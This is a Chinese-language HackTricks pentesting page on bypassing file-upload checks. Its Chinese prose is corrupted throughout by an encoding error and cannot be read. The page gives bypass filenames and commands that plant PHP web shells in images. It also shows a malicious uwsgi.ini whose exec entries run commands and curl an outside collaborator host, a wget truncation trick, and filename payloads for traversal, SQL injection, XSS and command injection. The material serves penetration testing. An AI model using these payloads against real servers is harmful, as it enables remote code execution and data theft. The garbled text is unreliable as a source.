# æ–‡ä»¶ä¸Šä¼ 

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

å¦‚æœä½ å¯¹ **é»‘å®¢èŒä¸š** æ„Ÿå…´è¶£å¹¶æƒ³è¦æ”»ç ´ä¸å¯æ”»ç ´çš„ - **æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼** (_éœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦å†™å’Œå£è¯­èƒ½åŠ›_).

{% embed url="https://www.stmcyber.com/careers" %}

## æ–‡ä»¶ä¸Šä¼ ä¸€èˆ¬æ–¹æ³•è®º

å…¶ä»–æœ‰ç”¨çš„æ‰©å±•åï¼š

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **åœ¨ PHPv8 ä¸­å·¥ä½œ**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web æœåŠ¡å™¨**: _.yaws_

### ç»•è¿‡æ–‡ä»¶æ‰©å±•åæ£€æŸ¥

1. å¦‚æœé€‚ç”¨ï¼Œ**æ£€æŸ¥** **ä¹‹å‰çš„æ‰©å±•å**ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº› **å¤§å†™å­—æ¯** æµ‹è¯•å®ƒä»¬ï¼š_pHp, .pHP5, .PhAr ..._
2. _æ£€æŸ¥ **åœ¨æ‰§è¡Œæ‰©å±•åä¹‹å‰æ·»åŠ æœ‰æ•ˆæ‰©å±•å**ï¼ˆä¹Ÿä½¿ç”¨ä¹‹å‰çš„æ‰©å±•åï¼‰ï¼š_
* _file.png.php_
* _file.png.Php5_
3. å°è¯•åœ¨æœ«å°¾æ·»åŠ  **ç‰¹æ®Šå­—ç¬¦**ã€‚ä½ å¯ä»¥ä½¿ç”¨ Burp æ¥ **æš´åŠ›ç ´è§£** æ‰€æœ‰çš„ **ascii** å’Œ **Unicode** å­—ç¬¦ã€‚ (_æ³¨æ„ä½ ä¹Ÿå¯ä»¥å°è¯•ä½¿ç”¨ **ä¹‹å‰** æåˆ°çš„ **æ‰©å±•å**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. å°è¯•é€šè¿‡ **æ¬ºéª—æœåŠ¡å™¨ç«¯çš„æ‰©å±•è§£æå™¨** æ¥ç»•è¿‡ä¿æŠ¤ï¼Œä½¿ç”¨åƒ **åŒé‡** æ‰©å±•åæˆ– **æ·»åŠ åƒåœ¾** æ•°æ®ï¼ˆ**ç©º** å­—èŠ‚ï¼‰åœ¨æ‰©å±•åä¹‹é—´ã€‚_ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ **ä¹‹å‰çš„æ‰©å±•å** æ¥å‡†å¤‡æ›´å¥½çš„æœ‰æ•ˆè½½è·ã€‚_
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. åœ¨ä¹‹å‰çš„æ£€æŸ¥ä¸­æ·»åŠ  **å¦ä¸€å±‚æ‰©å±•å**ï¼š
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. å°è¯•å°† **exec æ‰©å±•åæ”¾åœ¨æœ‰æ•ˆæ‰©å±•åä¹‹å‰**ï¼Œå¹¶ç¥ˆç¥·æœåŠ¡å™¨é…ç½®é”™è¯¯ã€‚ï¼ˆæœ‰åŠ©äºåˆ©ç”¨ Apache é…ç½®é”™è¯¯ï¼Œå…¶ä¸­ä»»ä½•å¸¦æœ‰æ‰©å±•å **_**.php**_** çš„å†…å®¹ï¼Œä½†ä¸ä¸€å®šä»¥ .php ç»“å°¾çš„å†…å®¹å°†æ‰§è¡Œä»£ç ï¼‰ï¼š
* _ä¾‹å¦‚ï¼š file.php.png_
7. åœ¨ **Windows** ä¸­ä½¿ç”¨ **NTFS å¤‡ç”¨æ•°æ®æµ (ADS)**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå†’å·å­—ç¬¦ â€œ:â€ å°†æ’å…¥åœ¨ç¦æ­¢æ‰©å±•åä¹‹åå’Œå…è®¸æ‰©å±•åä¹‹å‰ã€‚å› æ­¤ï¼Œå°†åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ª **å¸¦æœ‰ç¦æ­¢æ‰©å±•åçš„ç©ºæ–‡ä»¶**ï¼ˆä¾‹å¦‚ â€œfile.asax:.jpgâ€ï¼‰ã€‚è¯¥æ–‡ä»¶å¯ä»¥ç¨åä½¿ç”¨å…¶ä»–æŠ€æœ¯è¿›è¡Œç¼–è¾‘ï¼Œä¾‹å¦‚ä½¿ç”¨å…¶çŸ­æ–‡ä»¶åã€‚â€œ**::$data**â€ æ¨¡å¼ä¹Ÿå¯ä»¥ç”¨äºåˆ›å»ºéç©ºæ–‡ä»¶ã€‚å› æ­¤ï¼Œåœ¨æ­¤æ¨¡å¼åæ·»åŠ ä¸€ä¸ªç‚¹å­—ç¬¦ä¹Ÿå¯èƒ½æœ‰åŠ©äºç»•è¿‡è¿›ä¸€æ­¥çš„é™åˆ¶ï¼ˆä¾‹å¦‚ â€œfile.asp::$data.â€ï¼‰
8. å°è¯•æ‰“ç ´æ–‡ä»¶åé™åˆ¶ã€‚æœ‰æ•ˆæ‰©å±•åè¢«æˆªæ–­ã€‚æ¶æ„ PHP è¢«ä¿ç•™ã€‚AAA<--SNIP-->AAA.php

```
# Linux æœ€å¤§ 255 å­—èŠ‚
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # åœ¨è¿™é‡Œå‡å» 4 å¹¶æ·»åŠ  .png
# ä¸Šä¼ æ–‡ä»¶å¹¶æ£€æŸ¥å“åº”å…è®¸å¤šå°‘ä¸ªå­—ç¬¦ã€‚å‡è®¾ 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# åˆ¶ä½œæœ‰æ•ˆè½½è·
AAA<--SNIP 232 A-->AAA.php.png
```

### ç»•è¿‡å†…å®¹ç±»å‹ã€é­”æœ¯æ•°å­—ã€å‹ç¼©å’Œè°ƒæ•´å¤§å°

* é€šè¿‡å°† **Content-Type** **å¤´** çš„ **å€¼** è®¾ç½®ä¸ºï¼š_image/png_ , _text/plain , application/octet-stream_ æ¥ç»•è¿‡ **Content-Type** æ£€æŸ¥ã€‚
1. Content-Type **å­—å…¸**ï¼š[https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
* é€šè¿‡åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ  **çœŸå®å›¾åƒçš„å­—èŠ‚** æ¥ç»•è¿‡ **é­”æœ¯æ•°å­—** æ£€æŸ¥ï¼ˆæ··æ·† _file_ å‘½ä»¤ï¼‰ã€‚æˆ–è€…åœ¨ **å…ƒæ•°æ®** ä¸­å¼•å…¥ shellï¼š\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` æˆ–è€…ä½ ä¹Ÿå¯ä»¥ **ç›´æ¥åœ¨å›¾åƒä¸­å¼•å…¥æœ‰æ•ˆè½½è·**ï¼š\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* å¦‚æœ **å‹ç¼©è¢«æ·»åŠ åˆ°ä½ çš„å›¾åƒ**ï¼Œä¾‹å¦‚ä½¿ç”¨ä¸€äº›æ ‡å‡†çš„ PHP åº“å¦‚ [PHP-GD](https://www.php.net/manual/fr/book.image.php)ï¼Œé‚£ä¹ˆä¹‹å‰çš„æŠ€æœ¯å°†æ— æ•ˆã€‚ç„¶è€Œï¼Œä½ å¯ä»¥ä½¿ç”¨ **PLTE å—** [**åœ¨è¿™é‡Œå®šä¹‰çš„æŠ€æœ¯**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) æ’å…¥ä¸€äº›æ–‡æœ¬ä»¥ **åœ¨å‹ç¼©ä¸­å­˜æ´»**ã€‚
* [**å¸¦æœ‰ä»£ç çš„ GitHub**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* ç½‘é¡µä¹Ÿå¯èƒ½åœ¨ **è°ƒæ•´å›¾åƒå¤§å°**ï¼Œä¾‹å¦‚ä½¿ç”¨ PHP-GD å‡½æ•° `imagecopyresized` æˆ– `imagecopyresampled`ã€‚ç„¶è€Œï¼Œä½ å¯ä»¥ä½¿ç”¨ **IDAT å—** [**åœ¨è¿™é‡Œå®šä¹‰çš„æŠ€æœ¯**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) æ’å…¥ä¸€äº›æ–‡æœ¬ä»¥ **åœ¨å‹ç¼©ä¸­å­˜æ´»**ã€‚
* [**å¸¦æœ‰ä»£ç çš„ GitHub**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* å¦ä¸€ç§åˆ¶ä½œ **åœ¨å›¾åƒè°ƒæ•´å¤§å°ä¸­å­˜æ´»çš„æœ‰æ•ˆè½½è·** çš„æŠ€æœ¯ï¼Œä½¿ç”¨ PHP-GD å‡½æ•° `thumbnailImage`ã€‚ç„¶è€Œï¼Œä½ å¯ä»¥ä½¿ç”¨ **tEXt å—** [**åœ¨è¿™é‡Œå®šä¹‰çš„æŠ€æœ¯**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) æ’å…¥ä¸€äº›æ–‡æœ¬ä»¥ **åœ¨å‹ç¼©ä¸­å­˜æ´»**ã€‚
* [**å¸¦æœ‰ä»£ç çš„ GitHub**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### å…¶ä»–æ£€æŸ¥æŠ€å·§

* æ‰¾åˆ°ä¸€ä¸ª **é‡å‘½å** å·²ä¸Šä¼ æ–‡ä»¶çš„æ¼æ´ï¼ˆä»¥æ›´æ”¹æ‰©å±•åï¼‰ã€‚
* æ‰¾åˆ°ä¸€ä¸ª **æœ¬åœ°æ–‡ä»¶åŒ…å«** æ¼æ´ä»¥æ‰§è¡Œåé—¨ã€‚
* **å¯èƒ½çš„ä¿¡æ¯æ³„éœ²**ï¼š
1. ä¸Šä¼  **å¤šæ¬¡**ï¼ˆå¹¶ä¸”åœ¨ **åŒä¸€æ—¶é—´**ï¼‰ç›¸åŒçš„ **æ–‡ä»¶**ï¼Œä½¿ç”¨ç›¸åŒçš„åç§°ã€‚
2. ä¸Šä¼ ä¸€ä¸ª **å·²ç»å­˜åœ¨** çš„ **æ–‡ä»¶** æˆ– **æ–‡ä»¶å¤¹** çš„ **åç§°** çš„æ–‡ä»¶ã€‚
3. ä¸Šä¼ ä¸€ä¸ª **â€œ.â€, â€œ..â€, æˆ– â€œâ€¦â€ ä½œä¸ºå…¶åç§°** çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œåœ¨ Apache çš„ **Windows** ä¸­ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ â€œ/www/uploads/â€ ç›®å½•ä¸­ï¼Œåç§°ä¸º â€œ.â€ çš„æ–‡ä»¶å°†åˆ›å»ºä¸€ä¸ªåä¸º â€œuploadsâ€ çš„æ–‡ä»¶åœ¨ â€œ/www/â€ ç›®å½•ä¸­ã€‚
4. ä¸Šä¼ ä¸€ä¸ªå¯èƒ½ä¸å®¹æ˜“åˆ é™¤çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ **â€œâ€¦:.jpgâ€** åœ¨ **NTFS** ä¸­ã€‚ï¼ˆWindowsï¼‰
5. åœ¨ **Windows** ä¸­ä¸Šä¼ ä¸€ä¸ªå¸¦æœ‰ **æ— æ•ˆå­—ç¬¦** çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ `|<>*?â€` åœ¨å…¶åç§°ä¸­ã€‚ï¼ˆWindowsï¼‰
6. åœ¨ **Windows** ä¸­ä¸Šä¼ ä¸€ä¸ªä½¿ç”¨ **ä¿ç•™**ï¼ˆ**ç¦æ­¢**ï¼‰ **åç§°** çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, å’Œ LPT9ã€‚
* è¿˜å¯ä»¥å°è¯• **ä¸Šä¼ ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶**ï¼ˆ.exeï¼‰æˆ–ä¸€ä¸ª **.html**ï¼ˆä¸å¤ªå¯ç–‘ï¼‰æ–‡ä»¶ï¼Œå½“å—å®³è€…æ„å¤–æ‰“å¼€æ—¶ **å°†æ‰§è¡Œä»£ç **ã€‚

### ç‰¹æ®Šæ‰©å±•åæŠ€å·§

å¦‚æœä½ å°è¯•å°†æ–‡ä»¶ä¸Šä¼ åˆ° **PHP æœåŠ¡å™¨**ï¼Œ [æŸ¥çœ‹ **.htaccess** æŠ€å·§ä»¥æ‰§è¡Œä»£ç ](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess)ã€‚\
å¦‚æœä½ å°è¯•å°†æ–‡ä»¶ä¸Šä¼ åˆ° **ASP æœåŠ¡å™¨**ï¼Œ [æŸ¥çœ‹ **.config** æŠ€å·§ä»¥æ‰§è¡Œä»£ç ](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files)ã€‚

`.phar` æ–‡ä»¶ç±»ä¼¼äº Java çš„ `.jar`ï¼Œä½†ç”¨äº PHPï¼Œå¹¶ä¸”å¯ä»¥ **åƒ PHP æ–‡ä»¶ä¸€æ ·ä½¿ç”¨**ï¼ˆé€šè¿‡ PHP æ‰§è¡Œæˆ–åœ¨è„šæœ¬ä¸­åŒ…å«å®ƒ...ï¼‰

`.inc` æ‰©å±•åæœ‰æ—¶ç”¨äºä»…ç”¨äº **å¯¼å…¥æ–‡ä»¶** çš„ PHP æ–‡ä»¶ï¼Œå› æ­¤ï¼Œåœ¨æŸäº›æ—¶å€™ï¼Œå¯èƒ½æœ‰äººå…è®¸ **æ­¤æ‰©å±•åè¢«æ‰§è¡Œ**ã€‚

## **Jetty RCE**

å¦‚æœä½ å¯ä»¥å°† XML æ–‡ä»¶ä¸Šä¼ åˆ° Jetty æœåŠ¡å™¨ï¼Œä½ å¯ä»¥è·å¾— [RCEï¼Œå› ä¸º **æ–°çš„ \*.xml å’Œ \*.war ä¼šè¢«è‡ªåŠ¨å¤„ç†**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** æ‰€ä»¥ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå°† XML æ–‡ä»¶ä¸Šä¼ åˆ° `$JETTY_BASE/webapps/` å¹¶æœŸå¾… shellï¼

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1047).png>)

## **uWSGI RCE**

æœ‰å…³æ­¤æ¼æ´çš„è¯¦ç»†æ¢ç´¢ï¼Œè¯·æŸ¥çœ‹åŸå§‹ç ”ç©¶ï¼š[uWSGI RCE åˆ©ç”¨](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)ã€‚

å¦‚æœèƒ½å¤Ÿä¿®æ”¹ `.ini` é…ç½®æ–‡ä»¶ï¼Œåˆ™å¯ä»¥åœ¨ uWSGI æœåŠ¡å™¨ä¸­åˆ©ç”¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œ (RCE) æ¼æ´ã€‚uWSGI é…ç½®æ–‡ä»¶åˆ©ç”¨ç‰¹å®šè¯­æ³•æ¥åŒ…å«â€œé­”æœ¯â€å˜é‡ã€å ä½ç¬¦å’Œè¿ç®—ç¬¦ã€‚ç‰¹åˆ«æ˜¯ï¼Œ`@` è¿ç®—ç¬¦ï¼Œä½œä¸º `@(filename)` ä½¿ç”¨ï¼Œæ—¨åœ¨åŒ…å«æ–‡ä»¶çš„å†…å®¹ã€‚åœ¨ uWSGI æ”¯æŒçš„å„ç§æ–¹æ¡ˆä¸­ï¼Œâ€œexecâ€ æ–¹æ¡ˆå°¤å…¶å¼ºå¤§ï¼Œå…è®¸ä»è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºè¯»å–æ•°æ®ã€‚å½“å¤„ç† `.ini` é…ç½®æ–‡ä»¶æ—¶ï¼Œå¯ä»¥åˆ©ç”¨æ­¤åŠŸèƒ½è¿›è¡Œæ¶æ„ç›®çš„ï¼Œä¾‹å¦‚è¿œç¨‹å‘½ä»¤æ‰§è¡Œæˆ–ä»»æ„æ–‡ä»¶å†™å…¥/è¯»å–ã€‚

è€ƒè™‘ä»¥ä¸‹æœ‰å®³çš„ `uwsgi.ini` æ–‡ä»¶ç¤ºä¾‹ï¼Œå±•ç¤ºå„ç§æ–¹æ¡ˆï¼š
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
åœ¨è§£æé…ç½®æ–‡ä»¶æ—¶ï¼Œè´Ÿè½½çš„æ‰§è¡Œä¼šå‘ç”Ÿã€‚ä¸ºäº†æ¿€æ´»å’Œè§£æé…ç½®ï¼ŒuWSGI è¿›ç¨‹å¿…é¡»è¢«é‡å¯ï¼ˆå¯èƒ½æ˜¯åœ¨å´©æºƒåæˆ–ç”±äºæ‹’ç»æœåŠ¡æ”»å‡»ï¼‰æˆ–æ–‡ä»¶å¿…é¡»è®¾ç½®ä¸ºè‡ªåŠ¨é‡è½½ã€‚å¦‚æœå¯ç”¨äº†è‡ªåŠ¨é‡è½½åŠŸèƒ½ï¼Œåœ¨æ£€æµ‹åˆ°æ›´æ”¹æ—¶ä¼šåœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…é‡æ–°åŠ è½½æ–‡ä»¶ã€‚

ç†è§£ uWSGI é…ç½®æ–‡ä»¶è§£æçš„å®½æ¾æ€§è´¨è‡³å…³é‡è¦ã€‚å…·ä½“æ¥è¯´ï¼Œè®¨è®ºçš„è´Ÿè½½å¯ä»¥æ’å…¥åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼ˆä¾‹å¦‚å›¾åƒæˆ– PDFï¼‰ï¼Œè¿›ä¸€æ­¥æ‰©å¤§æ½œåœ¨åˆ©ç”¨çš„èŒƒå›´ã€‚

## **wget æ–‡ä»¶ä¸Šä¼ /SSRF æŠ€å·§**

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨ **`wget`** æ¥ **ä¸‹è½½æ–‡ä»¶**ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥ **æŒ‡ç¤º** **URL**ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œä»£ç å¯èƒ½ä¼šæ£€æŸ¥ä¸‹è½½æ–‡ä»¶çš„æ‰©å±•åæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œä»¥ç¡®ä¿ä»…ä¸‹è½½å…è®¸çš„æ–‡ä»¶ã€‚ç„¶è€Œï¼Œ**æ­¤æ£€æŸ¥å¯ä»¥è¢«ç»•è¿‡ã€‚**\
**linux** ä¸­ **æ–‡ä»¶å** çš„ **æœ€å¤§** é•¿åº¦ä¸º **255**ï¼Œä½†æ˜¯ **wget** ä¼šå°†æ–‡ä»¶åæˆªæ–­ä¸º **236** ä¸ªå­—ç¬¦ã€‚æ‚¨å¯ä»¥ **ä¸‹è½½ä¸€ä¸ªåä¸º "A"\*232+".php"+".gif"** çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åå°† **ç»•è¿‡** **æ£€æŸ¥**ï¼ˆå› ä¸ºåœ¨è¿™ä¸ªä¾‹å­ä¸­ **".gif"** æ˜¯ä¸€ä¸ª **æœ‰æ•ˆ** æ‰©å±•åï¼‰ï¼Œä½† `wget` ä¼šå°†æ–‡ä»¶ **é‡å‘½å** ä¸º **"A"\*232+".php"**ã€‚
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
æ³¨æ„ï¼Œæ‚¨å¯èƒ½æ­£åœ¨è€ƒè™‘çš„**å¦ä¸€ä¸ªé€‰é¡¹**æ˜¯ä½¿**HTTPæœåŠ¡å™¨é‡å®šå‘åˆ°ä¸åŒçš„æ–‡ä»¶**ï¼Œè¿™æ ·åˆå§‹URLå°†ç»•è¿‡æ£€æŸ¥ï¼Œç„¶åwgetå°†ä¸‹è½½é‡å®šå‘çš„æ–‡ä»¶å¹¶ä½¿ç”¨æ–°åç§°ã€‚è¿™**ä¸ä¼šå·¥ä½œ**ï¼Œ**é™¤é**wgetä¸**å‚æ•°**`--trust-server-names`ä¸€èµ·ä½¿ç”¨ï¼Œå› ä¸º**wgetå°†ä¸‹è½½é‡å®šå‘é¡µé¢ï¼Œå¹¶ä½¿ç”¨åŸå§‹URLä¸­æŒ‡ç¤ºçš„æ–‡ä»¶å**ã€‚

## å·¥å…·

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©Pentesterså’ŒBug Huntersæµ‹è¯•æ–‡ä»¶ä¸Šä¼ æœºåˆ¶ã€‚å®ƒåˆ©ç”¨å„ç§æ¼æ´èµé‡‘æŠ€æœ¯æ¥ç®€åŒ–è¯†åˆ«å’Œåˆ©ç”¨æ¼æ´çš„è¿‡ç¨‹ï¼Œç¡®ä¿å¯¹Webåº”ç”¨ç¨‹åºè¿›è¡Œå…¨é¢è¯„ä¼°ã€‚

## ä»æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä»–æ¼æ´

* å°†**filename**è®¾ç½®ä¸º`../../../tmp/lol.png`å¹¶å°è¯•å®ç°**è·¯å¾„éå†**
* å°†**filename**è®¾ç½®ä¸º`sleep(10)-- -.jpg`ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿå®ç°**SQLæ³¨å…¥**
* å°†**filename**è®¾ç½®ä¸º`<svg onload=alert(document.domain)>`ä»¥å®ç°XSS
* å°†**filename**è®¾ç½®ä¸º`; sleep 10;`ä»¥æµ‹è¯•ä¸€äº›å‘½ä»¤æ³¨å…¥ï¼ˆæ›´å¤š[å‘½ä»¤æ³¨å…¥æŠ€å·§åœ¨è¿™é‡Œ](../command-injection.md)ï¼‰
* [**XSS**åœ¨å›¾åƒï¼ˆsvgï¼‰æ–‡ä»¶ä¸Šä¼ ä¸­](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS**æ–‡ä»¶**ä¸Šä¼ ** + **XSS** = [**Service Workers**åˆ©ç”¨](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXEåœ¨svgä¸Šä¼ ä¸­**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [é€šè¿‡ä¸Šä¼ svgæ–‡ä»¶çš„**Open Redirect**](../open-redirect.md#open-redirect-uploading-svg-files)
* å°è¯•æ¥è‡ª[**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)çš„**ä¸åŒsvgæœ‰æ•ˆè´Ÿè½½**\*\*\*\*
* [è‘—åçš„**ImageTrick**æ¼æ´](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
